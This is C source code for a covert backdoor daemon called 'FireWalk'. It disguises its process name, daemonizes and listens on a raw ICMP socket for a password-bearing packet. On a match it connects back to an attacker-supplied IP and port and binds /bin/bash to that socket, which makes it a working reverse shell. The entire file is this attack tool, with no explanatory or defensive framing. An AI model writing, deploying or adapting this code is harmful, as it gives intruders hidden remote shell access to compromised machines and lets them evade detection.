#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <popt.h>
#include <unistd.h>
#include <syslog.h>
#include <signal.h>
#include <sys/wait.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <netinet/ip_icmp.h>
#include <netinet/in.h>
#include <arpa/inet.h>


#define TRUE 1
#define FALSE 0
#define STDIN 0
#define STDOUT 1
#define STERR 2
#define MAXLINE 4096
#define PASSLEN 8


// GLOBALS
int sockfd;
int ready;
void (*logger)(int, const char *, ...);

struct icmp_payload {
    char pass[PASSLEN];
    struct in_addr addr;
    int port;
} *icmpdata;

struct cmdopts {
    const char *passwd;
    const char *pname;
    int logging;
}cmdline;

// PROTOTYPES
void parseopts(int argc, char *argv[], struct cmdopts *);
int process_packet(void);
char * sock_to_host(const struct sockaddr *, socklen_t);
void launch_shell(const char *, int);
static void sigchld_hdlr(int );
void dumblogger(int, const char *, ...);



int main(int argc, char *argv[])
{

    char *IDENT = "FireWalk";
    fd_set allset, rset;
    struct sigaction signal;


    parseopts(argc, argv, &cmdline);

    // Hide process name in ps list
    strcpy(argv[0], cmdline.pname);

    // Daemonize
    if ((daemon(0, 0) < 0))
        exit(1);

    if (cmdline.logging == TRUE) {
        logger = syslog;
        openlog(IDENT, LOG_CONS | LOG_PID, LOG_DAEMON);
    }
    else {
        logger = dumblogger;
    }

    memset(&signal, 0, sizeof(signal));
    signal.sa_handler = sigchld_hdlr;

    if(sigaction(SIGCHLD, &signal, 0)) {
        logger(LOG_ERR, "Error creating SIGCHLD hanlder, %m");
        exit(1);
    }

    if ( (sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) < 0 ) {
        logger(LOG_ERR, "Failed to create socket: %m");
        exit(1);
    }
    logger(LOG_INFO, "Successfully created socket: %d: %m", sockfd);

    FD_ZERO(&allset);
    FD_SET(sockfd, &allset);

    for (; ;) {
        rset = allset;
        ready = select(sockfd+1, &rset, NULL, NULL, NULL);

        if (FD_ISSET(sockfd, &rset))
            if (process_packet() <= 0)
                continue;
    }
    exit(0);
}


void parseopts(int argc, char *argv[], struct cmdopts *opts)
{
    char c;
    opts->logging = FALSE;
    poptContext optcon;
    struct poptOption options[] = {
        { "log", 'l', POPT_ARG_NONE, 0, 'l',
        "Use system logging"},
        POPT_AUTOHELP
        { NULL, 0, 0, NULL, 0}
    };
    optcon = poptGetContext(NULL, argc, (const char **)argv, options, 0);
    poptSetOtherOptionHelp(optcon, "[OPTIONS] <name> <password>");
    if (argc < 3) {
        poptPrintHelp(optcon, stderr, 0);
        exit(1);
    }
    while ((c = poptGetNextOpt(optcon)) >= 0) {
        if (c == 'l') {
            opts->logging = TRUE;
        }
        else {
            poptPrintHelp(optcon, stderr, 0);
            exit(1);
        }
    }

    if (c < -1) {
        fprintf(stderr, "%s: %s\n",
                poptBadOption(optcon, POPT_BADOPTION_NOALIAS),
                poptStrerror(c));
        exit(1);
    }
    opts->pname = poptGetArg(optcon);
    opts->passwd = poptGetArg(optcon);
    if (strlen(opts->passwd) > 8) {
            poptPrintHelp(optcon, stderr, 0);
            fprintf(stderr, "Password is too long!\n");
            exit(1);
    }
    if (!(poptPeekArg(optcon) == NULL)) {
        poptPrintHelp(optcon, stderr, 0);
        fprintf(stderr, "Extra arguments given\n");
        exit(1);
    }
    if (opts->pname == NULL) {
        poptPrintHelp(optcon, stderr, 0);
        fprintf(stderr, "Specify a process name\n");
        exit(1);
    }
    if (opts->passwd == NULL) {
        poptPrintHelp(optcon, stderr, 0);
        fprintf(stderr, "Specify a password\n");
        exit(1);
    }
    
    poptFreeContext(optcon);
    return;
}

int process_packet(void) 
{
    //char rbuf[sizeof(struct iphdr) + sizeof(struct icmp)];
    int hlen1, icmplen;
    char buf[MAXLINE];
    char *addr;
    ssize_t n;
    socklen_t len;
    struct ip *ip;
    struct icmp *icmp;
    struct sockaddr_in from;
    //struct icmpd_err icmpd_err;
    len = sizeof(from);

    if (cmdline.logging == TRUE) {
        logger = syslog;
    }
    else {
        logger = dumblogger;
    }

    //logger(LOG_INFO, "Reading from socket...");
    n = recvfrom(sockfd, buf, MAXLINE, 0, (struct sockaddr*) &from, &len);
    //logger(LOG_INFO, "recvfrom(), %d: %m", n);
    logger(LOG_INFO, "%d bytes ICMPv4 from %s:",
            n, sock_to_host((struct sockaddr*) &from, len));

    ip = (struct ip *) buf;
    hlen1 = ip->ip_hl << 2; /* length of IP header */

    icmp = (struct icmp *) (buf + hlen1); /* start of ICMP header */
    if ( (icmplen = n - hlen1) < 8) {
        logger(LOG_ERR, "Malformed ICMP packet. Length: %d < 8", icmplen);
        exit(1);
    }
    
    logger(LOG_INFO, "type = %d, code = %d\n", icmp->icmp_type,
            icmp->icmp_code); 

    icmpdata = (struct icmp_payload *) icmp->icmp_data;
    addr = inet_ntoa(icmpdata->addr);
    logger(LOG_INFO, "Password = %s", icmpdata->pass);

    if ( (strcmp(icmpdata->pass, cmdline.passwd)) == 0) {
        logger(LOG_INFO, "Passwords match!");
        launch_shell(addr, icmpdata->port);
    }
    else {
        logger(LOG_INFO, "Passwords DO NOT match!");
    }
  
    return 0;
} 


//
// Function: sigchld_hdlr
//
// SIGCHLD signal handler
//
static void sigchld_hdlr(int sig)
{
    while (waitpid(-1, NULL, WNOHANG) > 0) {
    }
}

//
// Function: sock_to_host
//
// Returns a string containing the IP address from a
// socket address structure.
//
char * sock_to_host(const struct sockaddr *sa, socklen_t salen)
{
    static char str[128];
    if (sa->sa_family == AF_INET) {
        struct sockaddr_in *sin = (struct sockaddr_in *) sa;
        if (inet_ntop(AF_INET, &sin->sin_addr, str, sizeof(str)) == NULL)
            return NULL;
        return str;
    }

    return NULL;
}

//
// Function: launch_shell
//
// Forks a child that connects to the Shell IP:PORT and starts a shell
//
void launch_shell(const char *addr, int port)
{
    pid_t pid;

    if ((pid = fork()) < 0) {
        logger(LOG_ERR, "Fork failed, %m");
        exit(1);
    }

    if (pid == 0) {

        int sockfd;
        int r1, r2, r3;
        struct sockaddr_in servaddr;
        
        if (cmdline.logging == TRUE) {
            logger = syslog;
        }
        else {
            logger = dumblogger;
        }

        logger(LOG_INFO, "Launching the shell connection!");
        logger(LOG_INFO, "Shell IP = %s\n", addr);
        logger(LOG_INFO, "Shell Port = %d\n", port);

        if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0 ) {
            logger(LOG_INFO, "Failed to open connecting socket!, %m");
            exit(1);
        }

        bzero(&servaddr, sizeof(servaddr));
        servaddr.sin_family = AF_INET;
        servaddr.sin_port = htons(port);
        if ( (inet_pton(AF_INET, addr, &servaddr.sin_addr) < 0 )) {
            logger(LOG_ERR, "inet_pton error, %m");
            exit(1);
        }

        if ((connect(sockfd, (struct sockaddr*) &servaddr, sizeof(servaddr))) < 0) {
            logger(LOG_ERR, "Shell connect back failed!, %m");
            exit(1);
        }

        close(STDIN);
        close(STDOUT);
        r1 = dup2(sockfd, STDIN);
        r2 = dup2(sockfd, STDOUT);
        r3 = dup2(sockfd, STERR);

        if ( r1 == -1 || r2 == -1 || r3 == -1) {
            logger(LOG_ERR, "dup2 failure, %m");
            exit(1);
        }

        execl("/bin/bash", "bash", (char *)0);
    }

}

void dumblogger(int a, const char *b, ...)
{
    printf("Dumb logger called!\n");
    return;
}
